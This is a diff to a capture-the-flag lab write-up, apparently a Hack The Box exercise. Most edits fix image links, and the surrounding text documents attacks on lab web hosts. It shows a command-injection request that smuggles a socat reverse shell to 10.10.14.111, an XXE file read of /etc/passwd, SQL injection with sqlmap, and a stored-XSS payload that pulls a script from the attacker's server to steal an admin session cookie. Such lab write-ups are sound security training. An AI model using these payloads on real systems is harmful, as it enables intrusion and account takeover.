@@ -407,7 +407,7 @@ socat TCP:10.10.14.111:9001 EXEC:bash
 GET /ping.php?ip=127.0.0.1%0aso'c'at${IFS}TCP:10.10.14.111:9001${IFS}EXEC:bash
 ```
 
-![](./vhosts/monitoring/monitoring0.png)
+![](./vhosts/monitoring/monitoring8.png)
 
 A shell as `webdev` is obtained on host `dmz01`:
 
@@ -452,7 +452,7 @@ Selecting items and going to checkout shows the "Complete Purchase" action accep
 
 ![](./vhosts/shopdev2/shopdev3.png)
 
-./vhosts/shopdev2/shopdev4.png
+![](./vhosts/shopdev2/shopdev4.png)
 
 An XXE payload is tested to read `/etc/passwd` and works:
 
@@ -467,11 +467,11 @@ An XXE payload is tested to read `/etc/passwd` and works:
 </root>
 ```
 
-./vhosts/shopdev2/shopdev5.png
+![](./vhosts/shopdev2/shopdev5.png)
 
 The same technique is used to read the flag:
 
-./vhosts/shopdev2/shopdev6.png
+![](./vhosts/shopdev2/shopdev6.png)
 
 **Flag:**
 
@@ -485,7 +485,7 @@ HTB{REDACTED}
 
 Testing a single quote (`'`) in the search field triggers a SQL syntax error, indicating a SQL injection:
 
-./vhosts/status/status1.png
+![](./vhosts/status/status1.png)
 
 The request is captured in Burp and passed to sqlmap:
 
@@ -521,11 +521,11 @@ The injection confirms the back-end is MySQL and dumps the `users` and `company`
 
 ## support.inlanefreight.local
 
-./vhosts/support/support1.png
+![](./vhosts/support/support1.png)
 
 The site is a support center with two main functions: buy a product and raise a ticket. The `/ticket.php` endpoint is vulnerable to stored XSS, used to capture the admin's session cookie:
 
-./vhosts/support/support2.png
+![](./vhosts/support/support2.png)
 
 `script.js` (hosted locally):
 
@@ -556,9 +556,9 @@ A local server is started with both files:
 sudo php -S 0.0.0.0:80
 ```
 
-The following payload is submitted in the ticket's message field:
+The following payload is submitted in the ticket's message field, as shown above:
 
-```
+```javascript
 "><script src="http://10.10.14.111/script.js"></script>
 ```
 
@@ -570,11 +570,11 @@ GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
 
 The cookie is added via Cookie-Editor:
 
-./vhosts/support/support3.png
+![](./vhosts/support/support3.png)
 
 Logging in with the stolen session grants access to the admin dashboard and the ticket queue, where the flag is visible:
 
-./vhosts/support/support4.png
+![](./vhosts/support/support4.png)
 
 **Flag:**
 
@@ -588,11 +588,15 @@ HTB{REDACTED}
 
 The page's only functionality is to track an order by its ID:
 
-./vhosts/tracking/tracking1.png
+![](./vhosts/tracking/tracking1.png)
 
-./vhosts/tracking/tracking2.png
+![](./vhosts/tracking/tracking2.png)
 
-Testing a basic XSS payload (`<script>alert(1)</script>`) confirms the input is executed as JavaScript rather than rendered as text (the "Tracking #" field becomes empty):
+Testing a basic XSS payload :
+
+`<script>alert(1)</script>`
+
+confirms the input is executed as JavaScript rather than rendered as text (the "Tracking #" field becomes empty):
 
 ./vhosts/tracking/tracking4.png
 
